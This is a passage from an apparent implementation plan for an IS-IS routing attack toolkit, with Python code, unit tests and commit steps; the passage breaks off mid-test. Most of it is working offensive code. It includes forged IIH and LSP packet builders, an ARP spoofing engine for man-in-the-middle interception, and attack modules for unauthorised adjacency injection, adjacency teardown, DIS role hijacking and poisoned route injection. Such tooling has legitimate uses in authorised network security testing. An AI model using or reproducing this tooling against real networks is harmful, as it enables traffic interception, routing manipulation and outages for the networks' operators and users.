        default_metric |= 0xC0  # external, type 7|6=11

    tlv_type = TLV_IP_INT_REACH if internal else TLV_IP_EXT_REACH
    entry = struct.pack("!B", default_metric)
    entry += b"\x80\x80\x80"  # delay/expense/error: S=1, value=0 (unsupported but present)
    entry += bytes(ip_parts)
    entry += bytes(mask_parts)

    return struct.pack("!BB", tlv_type, len(entry)) + entry


def _build_is_neighbors_tlv(sys_ids: list) -> bytes:
    """Build IS Neighbors TLV (type 6). Each neighbor = 6B MAC."""
    value = b""
    for sid in sys_ids:
        value += _mac_bytes(sid)
    return struct.pack("!BB", TLV_IS_NEIGHBORS, len(value)) + value


def _build_hostname_tlv(hostname: str) -> bytes:
    """Build Hostname TLV (type 137)."""
    name_bytes = hostname.encode("ascii")
    return struct.pack("!BB", TLV_HOSTNAME, len(name_bytes)) + name_bytes


def build_iih_packet(
    sys_id: str,
    area_addr: str,
    src_mac: str,
    level: int = 1,
    priority: int = 64,
    hold_timer: int = 30,
    hello_interval: int = 10,
    circ_id: int = 0,
    auth_type: int = AUTH_NONE,
    auth_key: bytes = b"",
    neighbors: list | None = None,
) -> bytes:
    """Build a complete ISIS IIH (Hello) PDU as raw bytes.

    Uses Scapy for layer construction, then serializes to bytes.
    """
    dst_mac = _build_level_mac(level)
    pdu_type = ISIS_TYPE_L1_IIH if level == 1 else ISIS_TYPE_L2_IIH

    isis_hdr = ISIS(
        type=pdu_type,
        sysid=sys_id.replace(".", ""),
    )

    hello = ISIS_Hello(
        circuit_type=level,
        sourceid=src_mac.replace(":", ""),
        holdingtimer=hold_timer,
        pdu_length=1492,
        priority=priority,
        lanid=(sys_id.replace(".", "") + "00"),
    )

    pkt = Ether(dst=dst_mac, src=src_mac) / _build_llc() / isis_hdr / hello
    raw_pkt = bytes(pkt)

    # Append TLVs as raw bytes after the Hello body
    tlvs = b""
    tlvs += _build_area_tlv(area_addr)
    tlvs += _build_protocols_tlv()
    if neighbors:
        tlvs += _build_is_neighbors_tlv(neighbors)
    if auth_key and auth_type != AUTH_NONE:
        tlvs += build_auth_tlv(auth_type, auth_key, raw_pkt + tlvs)

    return raw_pkt + tlvs


def build_lsp_packet(
    sys_id: str,
    lsp_id: str,
    src_mac: str,
    level: int = 1,
    sequence: int = 0x00000001,
    remaining_lifetime: int = 1200,
    checksum: int = 0,
    tlvs: bytes = b"",
    auth_type: int = AUTH_NONE,
    auth_key: bytes = b"",
) -> bytes:
    """Build a complete ISIS LSP PDU.

    LSP structure:
      common header (8+ bytes)
      u16 remaining_lifetime
      u32 lsp_id (variable: sysid(6) + pseudonode(1) + fragment(1))
      u32 sequence_number
      u16 checksum
      u8 P (partition repair) | ATT (4 bits) | LSPDBOL (1) | IS type (2)
      TLVs...
    """
    dst_mac = _build_level_mac(level)
    pdu_type = ISIS_TYPE_L1_LSP if level == 1 else ISIS_TYPE_L2_LSP

    # Parse lsp_id into components
    lsp_parts = lsp_id.replace(".", "").replace("-", "")
    if len(lsp_parts) < 14:
        lsp_parts = lsp_parts.ljust(16, "0")
    lsp_id_bytes = bytes.fromhex(lsp_parts[:16])

    isis_hdr = ISIS(
        type=pdu_type,
        sysid=sys_id.replace(".", ""),
    )

    lsp = ISIS_LSP(
        lspid=lsp_id_bytes,
        seqno=sequence,
        lifetime=remaining_lifetime,
        checksum=checksum,
        typeblock=0x03,  # L1 or L2 IS type, no overload
    )

    pkt = Ether(dst=dst_mac, src=src_mac) / _build_llc() / isis_hdr / lsp
    raw_pkt = bytes(pkt)

    full = raw_pkt + tlvs
    if auth_key and auth_type != AUTH_NONE:
        full += build_auth_tlv(auth_type, auth_key, full)

    return full


def build_lsp_with_tlvs(
    sys_id: str,
    lsp_id: str,
    src_mac: str,
    level: int = 1,
    sequence: int = 0x00000001,
    remaining_lifetime: int = 1200,
    overload_bit: bool = False,
    metric: int = 10,
    network_addr: str = "10.0.0.0",
    network_mask: str = "255.255.255.0",
    auth_type: int = AUTH_NONE,
    auth_key: bytes = b"",
) -> bytes:
    """Build a complete LSP with IP reachability TLVs.

    This is the high-level builder used by attack modules.
    """
    flags = 0x03  # L1/L2 IS
    if overload_bit:
        flags |= 0x10  # Set OL bit

    tlvs = b""
    tlvs += _build_protocols_tlv()
    tlvs += _build_hostname_tlv(sys_id.replace(".", "-"))

    if network_addr != "0.0.0.0":
        tlvs += build_ip_reachability_tlv(
            internal=True, network_addr=network_addr,
            network_mask=network_mask, metric=metric,
        )

    if overload_bit:
        # Set the LSPDBOL bit in the LSP typeblock
        pass  # Handled via flags in build_lsp_packet

    return build_lsp_packet(
        sys_id=sys_id, lsp_id=lsp_id, src_mac=src_mac,
        level=level, sequence=sequence,
        remaining_lifetime=remaining_lifetime,
        tlvs=tlvs, auth_type=auth_type, auth_key=auth_key,
    )


def parse_isis_packet(data: bytes):
    """Parse raw bytes into a Scapy ISIS packet."""
    try:
        pkt = Ether(data)
        if pkt.haslayer(ISIS):
            return pkt
        return None
    except Exception:
        return None


def get_isis_type_name(ptype: int) -> str:
    return ISIS_TYPE_NAMES.get(ptype, f"Unknown({ptype})")
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/unit/test_packet.py -v`
Expected: 8 PASS

- [ ] **Step 5: Commit**

```bash
git add isis_attack/core/packet.py tests/unit/test_packet.py
git commit -m "feat: add ISIS PDU construction and TLV builders"
```

---

## Phase 5: Core Engine — Neighbor, Sniffer, ARP Spoof

### Task 7: Neighbor state machine (neighbor.py)

**Files:**
- Create: `isis_attack/core/neighbor.py`
- Test: `tests/unit/test_neighbor.py`

ISIS neighbor states are simpler than OSPF: Down → Init → Up.

- [ ] **Step 1: Write the failing test**

```python
# tests/unit/test_neighbor.py
from isis_attack.core.neighbor import ISNeighborState, ISNeighbor

def test_neighbor_states():
    assert ISNeighborState.DOWN == 0
    assert ISNeighborState.INIT == 1
    assert ISNeighborState.UP == 2

def test_neighbor_creation():
    n = ISNeighbor(sys_id="1921.6800.2001", level=1)
    assert n.sys_id == "1921.6800.2001"
    assert n.state == ISNeighborState.DOWN
    assert n.level == 1

def test_neighbor_transitions():
    n = ISNeighbor(sys_id="1921.6800.2001", level=1)
    n.state = ISNeighborState.INIT
    assert n.state == ISNeighborState.INIT
    n.state = ISNeighborState.UP
    assert n.state == ISNeighborState.UP
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/unit/test_neighbor.py -v`
Expected: FAIL

- [ ] **Step 3: Write neighbor.py**

```python
"""IS-IS neighbor state machine (ISO 10589)."""
from enum import IntEnum


class ISNeighborState(IntEnum):
    DOWN = 0
    INIT = 1
    UP = 2


class ISNeighbor:
    def __init__(self, sys_id: str, level: int = 1):
        self.sys_id = sys_id
        self.level = level
        self.state = ISNeighborState.DOWN
        self.hold_timer = 0
        self.priority = 0
        self.area_addr = ""
        self.ip_addr = ""
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/unit/test_neighbor.py -v`
Expected: 3 PASS

- [ ] **Step 5: Commit**

```bash
git add isis_attack/core/neighbor.py tests/unit/test_neighbor.py
git commit -m "feat: add ISIS neighbor state machine"
```

### Task 8: Sniffer and ARP Spoof

**Files:**
- Create: `isis_attack/core/sniffer.py`
- Create: `isis_attack/core/arp_spoof.py`
- Test: `tests/unit/test_sniffer.py`

- [ ] **Step 1: Write sniffer.py**

```python
"""ISIS L2 packet sniffer using pcap-ct + Npcap."""
import threading
import time
from dataclasses import dataclass, field
from typing import List

try:
    import pcap
    HAS_PCAP = True
except (ImportError, OSError):
    HAS_PCAP = False

_MAX_PACKETS = 10000


@dataclass
class LSPEntry:
    lsp_id: str
    sequence: int
    remaining_lifetime: int
    hostname: str = ""


@dataclass
class TopologyModel:
    sys_ids: List[str] = field(default_factory=list)
    area_addrs: List[str] = field(default_factory=list)
    dis_map: dict = field(default_factory=dict)
    lsp_entries: List[LSPEntry] = field(default_factory=list)

    def add_sys(self, sys_id: str, area_addr: str) -> None:
        if sys_id not in self.sys_ids:
            self.sys_ids.append(sys_id)
        if area_addr not in self.area_addrs:
            self.area_addrs.append(area_addr)

    def add_lsp(self, lsp_id: str, sequence: int, remaining_lifetime: int,
                hostname: str = "") -> None:
        self.lsp_entries.append(LSPEntry(
            lsp_id=lsp_id, sequence=sequence,
            remaining_lifetime=remaining_lifetime, hostname=hostname,
        ))


class Sniffer:
    def __init__(self, iface: str):
        self.iface = iface
        self.available = HAS_PCAP
        self._sniffer = None
        self._stop_event = threading.Event()
        self._packets = []
        self._topology = TopologyModel()

    def start(self, timeout: int = 30) -> None:
        if not self.available:
            return
        self._stop_event.clear()
        self._packets = []

        def _capture():
            sniffer = pcap.pcap(name=self.iface, promisc=True, immediate=True)
            sniffer.setfilter("ether proto 0xFEFE")
            deadline = time.monotonic() + timeout
            try:
                for _ts, pkt in sniffer:
                    if time.monotonic() > deadline or self._stop_event.is_set():
                        break
                    if len(self._packets) < _MAX_PACKETS:
                        self._packets.append(pkt)
            except Exception:
                pass

        t = threading.Thread(target=_capture, daemon=True)
        t.start()
        self._sniffer = t

    def stop(self):
        self._stop_event.set()
        return self._packets

    @property
    def packets(self):
        return self._packets

    @property
    def topology(self):
        return self._topology
```

- [ ] **Step 2: Write arp_spoof.py** (same as OSPF version, adapted import paths)

```python
"""ARP spoofing engine — identical to OSPF version, operates at L2."""
import threading
import time
from scapy.all import Ether, ARP, srp1, sendp, get_if_hwaddr


class ArpSpoofEngine:
    def __init__(self, iface: str, target_a: str, target_b: str, interval: int = 2):
        self.iface = iface
        self.target_a = target_a
        self.target_b = target_b
        self.interval = interval
        self._running = False
        self._thread = None
        self._stop_event = threading.Event()
        self._real_mac_a = None
        self._real_mac_b = None

    def validate_targets(self) -> bool:
        return bool(self.target_a and self.target_b)

    def start(self) -> bool:
        if not self.validate_targets():
            return False
        if self._running:
            return False
        self._discover_macs()
        self._running = True
        self._stop_event.clear()
        self._thread = threading.Thread(target=self._spoof_loop, daemon=True)
        self._thread.start()
        return True

    def stop(self) -> None:
        self._running = False
        self._stop_event.set()
        self._restore()

    def _discover_macs(self) -> None:
        try:
            resp = srp1(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                op=1, pdst=self.target_a), iface=self.iface, timeout=2, verbose=False)
            if resp and resp.haslayer(ARP):
                self._real_mac_a = resp[ARP].hwsrc
        except Exception:
            pass
        try:
            resp = srp1(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                op=1, pdst=self.target_b), iface=self.iface, timeout=2, verbose=False)
            if resp and resp.haslayer(ARP):
                self._real_mac_b = resp[ARP].hwsrc
        except Exception:
            pass

    def _spoof_loop(self) -> None:
        my_mac = get_if_hwaddr(self.iface)
        while not self._stop_event.is_set():
            try:
                sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                    op=2, psrc=self.target_b, pdst=self.target_a,
                    hwsrc=my_mac, hwdst="ff:ff:ff:ff:ff:ff",
                ), iface=self.iface, verbose=False)
                sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                    op=2, psrc=self.target_a, pdst=self.target_b,
                    hwsrc=my_mac, hwdst="ff:ff:ff:ff:ff:ff",
                ), iface=self.iface, verbose=False)
            except Exception:
                pass
            self._stop_event.wait(timeout=self.interval)

    def _restore(self) -> None:
        if not self._real_mac_a and not self._real_mac_b:
            return
        try:
            for _ in range(3):
                if self._real_mac_a:
                    sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                        op=2, psrc=self.target_a, pdst=self.target_b,
                        hwsrc=self._real_mac_a, hwdst="ff:ff:ff:ff:ff:ff",
                    ), iface=self.iface, verbose=False)
                if self._real_mac_b:
                    sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                        op=2, psrc=self.target_b, pdst=self.target_a,
                        hwsrc=self._real_mac_b, hwdst="ff:ff:ff:ff:ff:ff",
                    ), iface=self.iface, verbose=False)
                time.sleep(0.5)
        except Exception:
            pass
```

- [ ] **Step 3: Write test**

```python
# tests/unit/test_sniffer.py
import pytest
from isis_attack.core.sniffer import TopologyModel, LSPEntry, Sniffer, HAS_PCAP

def test_topology_model():
    t = TopologyModel()
    t.add_sys("1921.6800.1001", "49.0001")
    t.add_sys("1921.6800.1002", "49.0001")
    assert len(t.sys_ids) == 2
    assert len(t.area_addrs) == 1

def test_lsp_entry():
    e = LSPEntry(lsp_id="1921.6800.1001.00-00", sequence=0x5, remaining_lifetime=1100)
    assert e.sequence == 5
    assert e.remaining_lifetime == 1100

def test_sniffer_disabled_without_pcap():
    if HAS_PCAP:
        pytest.skip("pcap available, skipping none-available test")
    s = Sniffer(iface="eth0")
    assert s.available is False
    s.start(timeout=1)
    assert s.packets == []
```

- [ ] **Step 4: Run tests**

Run: `pytest tests/unit/test_sniffer.py -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add isis_attack/core/sniffer.py isis_attack/core/arp_spoof.py tests/unit/test_sniffer.py
git commit -m "feat: add ISIS L2 sniffer and ARP spoof engine"
```

---

## Phase 6: Attack Base Class

### Task 9: BaseAttack abstract class

**Files:**
- Create: `isis_attack/attacks/base.py`
- Test: `tests/unit/test_attack_base.py`

- [ ] **Step 1: Write the test**

```python
# tests/unit/test_attack_base.py
import pytest
import threading
from isis_attack.attacks.base import BaseAttack
from isis_attack.config.types import AttackConfig, AttackResult, AttackMode, AttackCategory

class _DummyAttack(BaseAttack):
    name = "dummy"
    description = "test attack"
    category = AttackCategory.DOS

    def setup(self): pass
    def launch(self):
        return AttackResult(success=True, packets_sent=1, target_affected=False, details="dummy")
    def verify(self): return True
    def teardown(self): pass

def test_base_attack_run():
    config = AttackConfig(iface="eth0", target="01:80:C2:00:00:14")
    attack = _DummyAttack(config)
    result = attack.run()
    assert result.success
    assert result.packets_sent == 1

def test_base_attack_with_stop_event():
    config = AttackConfig(iface="eth0", target="01:80:C2:00:00:14")
    stop = threading.Event()
    attack = _DummyAttack(config, stop_event=stop)
    assert attack._stop_event is stop

def test_base_attack_repeated():
    class _RepeatedAttack(BaseAttack):
        name = "repeated"
        description = "test repeated"
        category = AttackCategory.ADJACENCY
        needs_repeated = True
        def setup(self):
            from isis_attack.network.sender import PacketSender
            self._sender = PacketSender(iface="eth0", packet_rate=100, max_packets=5)
            self.config.sniff_duration = 0.2
        def send_one_round(self): return True
        def launch(self): return AttackResult(success=True, packets_sent=0, target_affected=False, details="")
        def verify(self): return True
        def teardown(self): pass

    config = AttackConfig(iface="eth0", target="01:80:C2:00:00:14")
    config.sniff_duration = 0.2
    attack = _RepeatedAttack(config)
    result = attack.run()
    assert result.success
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/unit/test_attack_base.py -v`
Expected: FAIL

- [ ] **Step 3: Write base.py**

```python
"""BaseAttack abstract class with 4-phase lifecycle."""
import threading
import time
from abc import ABC, abstractmethod
from isis_attack.config.types import AttackResult, AttackMode, AttackCategory, SniffMode


class BaseAttack(ABC):
    name: str = ""
    description: str = ""
    category: AttackCategory
    default_mode: AttackMode = AttackMode.PASSIVE
    needs_repeated: bool = False

    def __init__(self, config, stop_event: threading.Event | None = None):
        self.config = config
        self._sniffer = None
        self._sender = None
        self._stop_event = stop_event or threading.Event()

    @abstractmethod
    def setup(self) -> None:
        """阶段一：初始化"""

    @abstractmethod
    def launch(self) -> AttackResult:
        """阶段二：执行攻击"""

    @abstractmethod
    def verify(self) -> bool:
        """阶段三：验证攻击效果"""

    @abstractmethod
    def teardown(self) -> None:
        """阶段四：清理资源"""

    def send_one_round(self) -> bool:
        return False

    def run(self) -> AttackResult:
        result = None
        try:
            self.setup()
            if self.needs_repeated:
                result = self._run_repeated()
            else:
                result = self.launch()
                result.target_affected = self.verify()
        except Exception as e:
            result = AttackResult(
                success=False, packets_sent=0, target_affected=False,
                details=f"攻击执行失败: {e}",
            )
        finally:
            try:
                self.teardown()
            except Exception as e:
                if result is not None:
                    result.details += f" (teardown 异常: {e})"
        return result

    def _run_repeated(self) -> AttackResult:
        deadline = time.time() + self.config.sniff_duration
        rounds = 0
        while time.time() < deadline and not self._stop_event.is_set():
            if self.send_one_round():
                rounds += 1
            time.sleep(1.0 / max(getattr(self.config, 'packet_rate', 1), 1))
        total_sent = self._sender.sent_count if self._sender else 0
        return AttackResult(
            success=rounds > 0,
            packets_sent=total_sent,
            target_affected=False,
            details=f"{self.name}: {rounds} rounds, {total_sent} packets sent",
        )
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/unit/test_attack_base.py -v`
Expected: 3 PASS

- [ ] **Step 5: Commit**

```bash
git add isis_attack/attacks/base.py tests/unit/test_attack_base.py
git commit -m "feat: add BaseAttack abstract class"
```

---

## Phase 7: Adjacency Attacks (3)

### Task 10: IIH Inject attack

**Files:**
- Create: `isis_attack/attacks/adjacency/iih_inject.py`
- Test: `tests/unit/test_iih_inject.py`

- [ ] **Step 1: Write test**

```python
# tests/unit/test_iih_inject.py
import pytest
from unittest.mock import patch, MagicMock
from isis_attack.config.types import IIHConfig
from isis_attack.attacks.adjacency.iih_inject import IIHInjectAttack

@patch("isis_attack.attacks.adjacency.iih_inject.PacketSender")
@patch("isis_attack.attacks.adjacency.iih_inject.get_local_mac")
def test_iih_inject_setup(mock_mac, mock_sender_cls):
    mock_mac.return_value = "00:11:22:33:44:55"
    mock_sender = MagicMock()
    mock_sender_cls.return_value = mock_sender
    mock_sender.send_l2.return_value = True
    mock_sender.sent_count = 1

    config = IIHConfig(iface="eth0", target="01:80:C2:00:00:14")
    attack = IIHInjectAttack(config)
    attack.setup()
    assert attack._sender is not None

@patch("isis_attack.attacks.adjacency.iih_inject.PacketSender")
@patch("isis_attack.attacks.adjacency.iih_inject.get_local_mac")
def test_iih_inject_launch(mock_mac, mock_sender_cls):
    mock_mac.return_value = "00:11:22:33:44:55"
    mock_sender = MagicMock()
    mock_sender_cls.return_value = mock_sender
    mock_sender.send_l2.return_value = True
    mock_sender.sent_count = 1

    config = IIHConfig(iface="eth0", target="01:80:C2:00:00:14",
                       sys_id="1921.6800.9999", area_addr="49.0001",
                       priority=127)
    attack = IIHInjectAttack(config)
    attack.setup()
    result = attack.launch()
    assert result.success
    assert "IIH 注入" in result.details
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/unit/test_iih_inject.py -v`
Expected: FAIL

- [ ] **Step 3: Write iih_inject.py**

```python
from isis_attack.attacks.base import BaseAttack, AttackResult, AttackCategory
from isis_attack.config.types import IIHConfig
from isis_attack.core.packet import build_iih_packet, ISIS_MAC_L1, ISIS_MAC_L2
from isis_attack.network.sender import PacketSender


class IIHInjectAttack(BaseAttack):
    name = "iih-inject"
    description = "注入伪造 IIH (IS-IS Hello) 建立未授权邻接关系"
    category = AttackCategory.ADJACENCY
    needs_repeated = True
    config: IIHConfig

    def __init__(self, config: IIHConfig):
        super().__init__(config)
        self._arp_engine = None

    def setup(self) -> None:
        from isis_attack.network.adapter import get_local_mac
        self._src_mac = get_local_mac(self.config.iface)
        self._sender = PacketSender(
            iface=self.config.iface,
            packet_rate=self.config.packet_rate,
            max_packets=self.config.max_packets,
        )
        if self.config.sniff_mode.value == "arp_spoof":
            from isis_attack.core.arp_spoof import ArpSpoofEngine
            self._arp_engine = ArpSpoofEngine(
                iface=self.config.iface,
                target_a=self.config.arp_target_a,
                target_b=self.config.arp_target_b,
                interval=self.config.arp_interval,
            )
            self._arp_engine.start()

        self._target_mac = ISIS_MAC_L1 if self.config.level == 1 else ISIS_MAC_L2

    def send_one_round(self) -> bool:
        auth_type = {"none": 0, "plain": 1, "md5": 2}.get(self.config.auth_type, 0)
        auth_key = self.config.auth_key.encode() if self.config.auth_key else b""
        pkt = build_iih_packet(
            sys_id=self.config.sys_id,
            area_addr=self.config.area_addr,
            src_mac=self._src_mac,
            level=self.config.level,
            priority=self.config.priority,
            hold_timer=self.config.hold_timer,
            hello_interval=self.config.hello_interval,
            auth_type=auth_type,
            auth_key=auth_key,
        )
        return self._sender.send_l2(Ether(pkt))

    def launch(self) -> AttackResult:
        ok = self.send_one_round()
        return AttackResult(
            success=ok, packets_sent=self._sender.sent_count,
            target_affected=False,
            details=f"IIH 注入: System ID={self.config.sys_id}, Priority={self.config.priority}, Level={self.config.level}",
        )

    def verify(self) -> bool:
        return self._sender.sent_count > 1

    def teardown(self) -> None:
        if self._arp_engine:
            self._arp_engine.stop()
```

- [ ] **Step 4: Run test**

Run: `pytest tests/unit/test_iih_inject.py -v`
Expected: 2 PASS

- [ ] **Step 5: Commit**

```bash
git add isis_attack/attacks/adjacency/iih_inject.py tests/unit/test_iih_inject.py
git commit -m "feat: add IIH inject attack"
```

### Task 11: Adjacency Break attack

**Files:**
- Create: `isis_attack/attacks/adjacency/adjacency_break.py`
- Test: `tests/unit/test_adjacency_break.py`

- [ ] **Step 1: Write test**

```python
# tests/unit/test_adjacency_break.py
import pytest
from unittest.mock import patch, MagicMock
from isis_attack.config.types import IIHConfig
from isis_attack.attacks.adjacency.adjacency_break import AdjacencyBreakAttack

@patch("isis_attack.attacks.adjacency.adjacency_break.PacketSender")
@patch("isis_attack.attacks.adjacency.adjacency_break.get_local_mac")
def test_adjacency_break(mock_mac, mock_sender_cls):
    mock_mac.return_value = "00:11:22:33:44:55"
    mock_sender = MagicMock()
    mock_sender_cls.return_value = mock_sender
    mock_sender.send_l2.return_value = True
    mock_sender.sent_count = 1

    config = IIHConfig(iface="eth0", target="01:80:C2:00:00:14",
                       sys_id="1921.6800.9999", area_addr="49.0002")  # wrong area
    attack = AdjacencyBreakAttack(config)
    attack.setup()
    result = attack.launch()
    assert result.success
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/unit/test_adjacency_break.py -v`
Expected: FAIL

- [ ] **Step 3: Write adjacency_break.py**

```python
from isis_attack.attacks.base import BaseAttack, AttackResult, AttackCategory
from isis_attack.config.types import IIHConfig
from isis_attack.core.packet import build_iih_packet
from isis_attack.network.sender import PacketSender


class AdjacencyBreakAttack(BaseAttack):
    name = "adjacency-break"
    description = "注入畸形 IIH (错误 Area 地址/Hold Timer=0) 破坏合法邻接关系"
    category = AttackCategory.ADJACENCY
    config: IIHConfig

    def setup(self) -> None:
        from isis_attack.network.adapter import get_local_mac
        self._src_mac = get_local_mac(self.config.iface)
        self._sender = PacketSender(
            iface=self.config.iface,
            packet_rate=self.config.packet_rate,
            max_packets=self.config.max_packets,
        )

    def launch(self) -> AttackResult:
        # Use wrong area address and hold_timer=0 to break adjacency
        pkt = build_iih_packet(
            sys_id=self.config.sys_id,
            area_addr="49.9999",  # wrong area
            src_mac=self._src_mac,
            level=self.config.level,
            priority=0,
            hold_timer=0,  # immediate teardown
        )
        ok = self._sender.send_l2(pkt)
        return AttackResult(
            success=ok, packets_sent=self._sender.sent_count,
            target_affected=False,
            details="邻接破坏: 注入错误 Area 地址 + Hold=0 的 IIH",
        )

    def verify(self) -> bool:
        return self._sender.sent_count > 0

    def teardown(self) -> None:
        pass
```

- [ ] **Step 4: Run test**

Run: `pytest tests/unit/test_adjacency_break.py -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add isis_attack/attacks/adjacency/adjacency_break.py tests/unit/test_adjacency_break.py
git commit -m "feat: add adjacency break attack"
```

### Task 12: DIS Hijack attack

**Files:**
- Create: `isis_attack/attacks/adjacency/dis_hijack.py`
- Test: `tests/unit/test_dis_hijack.py`

- [ ] **Step 1: Write test**

```python
# tests/unit/test_dis_hijack.py
import pytest
from unittest.mock import patch, MagicMock
from isis_attack.config.types import IIHConfig
from isis_attack.attacks.adjacency.dis_hijack import DISHijackAttack

@patch("isis_attack.attacks.adjacency.dis_hijack.PacketSender")
@patch("isis_attack.attacks.adjacency.dis_hijack.get_local_mac")
def test_dis_hijack(mock_mac, mock_sender_cls):
    mock_mac.return_value = "00:11:22:33:44:55"
    mock_sender = MagicMock()
    mock_sender_cls.return_value = mock_sender
    mock_sender.send_l2.return_value = True
    mock_sender.sent_count = 3

    config = IIHConfig(iface="eth0", target="01:80:C2:00:00:14",
                       sys_id="1921.6800.9999", priority=127, sniff_duration=1)
    attack = DISHijackAttack(config)
    attack.setup()
    result = attack.launch()
    assert result.success
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/unit/test_dis_hijack.py -v`
Expected: FAIL

- [ ] **Step 3: Write dis_hijack.py**

```python
from isis_attack.attacks.base import BaseAttack, AttackResult, AttackCategory
from isis_attack.config.types import IIHConfig
from isis_attack.core.packet import build_iih_packet, ISIS_MAC_L1, ISIS_MAC_L2
from isis_attack.network.sender import PacketSender


class DISHijackAttack(BaseAttack):
    name = "dis-hijack"
    description = "发送 Priority=127 的 IIH 抢占 DIS 角色"
    category = AttackCategory.ADJACENCY
    needs_repeated = True
    config: IIHConfig

    def setup(self) -> None:
        from isis_attack.network.adapter import get_local_mac
        self._src_mac = get_local_mac(self.config.iface)
        self._sender = PacketSender(
            iface=self.config.iface,
            packet_rate=self.config.packet_rate,
            max_packets=self.config.max_packets,
        )
        self._target_mac = ISIS_MAC_L1 if self.config.level == 1 else ISIS_MAC_L2

    def send_one_round(self) -> bool:
        pkt = build_iih_packet(
            sys_id=self.config.sys_id,
            area_addr=self.config.area_addr,
            src_mac=self._src_mac,
            level=self.config.level,
            priority=127,  # max priority for DIS
            hold_timer=self.config.hold_timer,
            hello_interval=self.config.hello_interval,
        )
        return self._sender.send_l2(pkt)

    def launch(self) -> AttackResult:
        ok = self.send_one_round()
        return AttackResult(
            success=ok, packets_sent=self._sender.sent_count,
            target_affected=False,
            details=f"DIS 抢占: Priority=127, System ID={self.config.sys_id}",
        )

    def verify(self) -> bool:
        return self._sender.sent_count > 1

    def teardown(self) -> None:
        pass
```

- [ ] **Step 4: Run test**

Run: `pytest tests/unit/test_dis_hijack.py -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add isis_attack/attacks/adjacency/dis_hijack.py tests/unit/test_dis_hijack.py
git commit -m "feat: add DIS hijack attack"
```

---

## Phase 8: LSP Attacks (5)

### Task 13: Route Inject attack

**Files:**
- Create: `isis_attack/attacks/lsp/route_inject.py`
- Test: `tests/unit/test_route_inject.py`

- [ ] **Step 1: Write test**

```python
# tests/unit/test_route_inject.py
import pytest
from unittest.mock import patch, MagicMock
from isis_attack.config.types import LSPConfig
from isis_attack.attacks.lsp.route_inject import RouteInjectAttack

@patch("isis_attack.attacks.lsp.route_inject.PacketSender")
@patch("isis_attack.attacks.lsp.route_inject.get_local_mac")
def test_route_inject(mock_mac, mock_sender_cls):
    mock_mac.return_value = "00:11:22:33:44:55"
    mock_sender = MagicMock()
    mock_sender_cls.return_value = mock_sender
    mock_sender.send_l2.return_value = True
    mock_sender.sent_count = 1

    config = LSPConfig(iface="eth0", target="01:80:C2:00:00:14",
                       sys_id="1921.6800.9999", lsp_id="1921.6800.9999.00-00",
                       metric=100, network_addr="10.99.0.0")
    attack = RouteInjectAttack(config)
    attack.setup()
    result = attack.launch()
    assert result.success
    assert "路由注入" in result.details
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/unit/test_route_inject.py -v`
Expected: FAIL

- [ ] **Step 3: Write route_inject.py**

```python
from isis_attack.attacks.base import BaseAttack, AttackResult, AttackCategory
from isis_attack.config.types import LSPConfig
from isis_attack.core.packet import build_lsp_with_tlvs
from isis_attack.network.sender import PacketSender


class RouteInjectAttack(BaseAttack):
    name = "route-inject"
    description = "注入含毒化 IP Reachability TLV 的 LSP 篡改路由表"
    category = AttackCategory.LSP
    config: LSPConfig

    def setup(self) -> None:
        from isis_attack.network.adapter import get_local_mac
        self._src_mac = get_local_mac(self.config.iface)
        self._sender = PacketSender(
            iface=self.config.iface,
            packet_rate=self.config.packet_rate,
            max_packets=self.config.max_packets,
        )

    def launch(self) -> AttackResult:
        lsp_id = self.config.lsp_id
        if not lsp_id:
            lsp_id = f"{self.config.sys_id}.00-00"
        auth_type = {"none": 0, "plain": 1, "md5": 2}.get(self.config.auth_type, 0)
        auth_key = self.config.auth_key.encode() if self.config.auth_key else b""
        pkt = build_lsp_with_tlvs(
            sys_id=self.config.sys_id,
            lsp_id=lsp_id,
            src_mac=self._src_mac,
            level=self.config.level,
            sequence=self.config.sequence,
            remaining_lifetime=self.config.remaining_lifetime,
            metric=self.config.metric,
            network_addr=self.config.network_addr,
            network_mask=self.config.network_mask,
            auth_type=auth_type,
            auth_key=auth_key,
        )
        ok = self._sender.send_l2(pkt)
        return AttackResult(
            success=ok, packets_sent=self._sender.sent_count,
            target_affected=False,
            details=f"路由注入: LSP={lsp_id}, metric={self.config.metric}, net={self.config.network_addr}",
        )

    def verify(self) -> bool:
        return self._sender.sent_count > 0

    def teardown(self) -> None:
        pass
```

- [ ] **Step 4: Run test**

Run: `pytest tests/unit/test_route_inject.py -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add isis_attack/attacks/lsp/route_inject.py tests/unit/test_route_inject.py
git commit -m "feat: add LSP route inject attack"
```

### Task 14: Max Sequence attack

**Files:**
- Create: `isis_attack/attacks/lsp/max_seq.py`
- Test: `tests/unit/test_max_seq.py`

- [ ] **Step 1: Write test + implementation**

```python
# tests/unit/test_max_seq.py
import pytest
from unittest.mock import patch, MagicMock
from isis_attack.config.types import LSPConfig
from isis_attack.attacks.lsp.max_seq import MaxSeqAttack

@patch("isis_attack.attacks.lsp.max_seq.PacketSender")
@patch("isis_attack.attacks.lsp.max_seq.get_local_mac")
def test_max_seq(mock_mac, mock_sender_cls):
    mock_mac.return_value = "00:11:22:33:44:55"
    mock_sender = MagicMock()
    mock_sender_cls.return_value = mock_sender
    mock_sender.send_l2.return_value = True
    mock_sender.sent_count = 1

    config = LSPConfig(iface="eth0", target="01:80:C2:00:00:14",
                       sys_id="1921.6800.9999")
    attack = MaxSeqAttack(config)
    attack.setup()
